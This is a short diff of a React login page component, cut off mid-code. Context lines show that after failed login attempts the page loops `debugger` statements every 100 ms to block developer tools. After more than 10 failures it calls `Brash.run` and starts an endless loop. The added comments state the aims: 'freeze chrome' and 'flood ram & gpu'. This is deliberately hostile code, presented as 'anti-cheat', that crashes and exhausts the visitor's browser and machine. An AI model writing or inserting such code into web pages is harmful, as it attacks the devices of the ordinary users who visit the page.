@@ -32,12 +32,15 @@ export default function LoginPage({
 
   useEffect(() => {
     if (failed === 0) return;
+    // no more devtool
     const int = setInterval(() => {
       // biome-ignore lint/suspicious/noDebugger: anti-cheat
       debugger;
     }, 100);
     if (failed > 10) {
+      // freeze chrome
       Brash.run({});
+      // flood ram & gpu
       setTimeout(() => {
         // biome-ignore lint/correctness/noConstantCondition: anti-cheat
         while (1) {
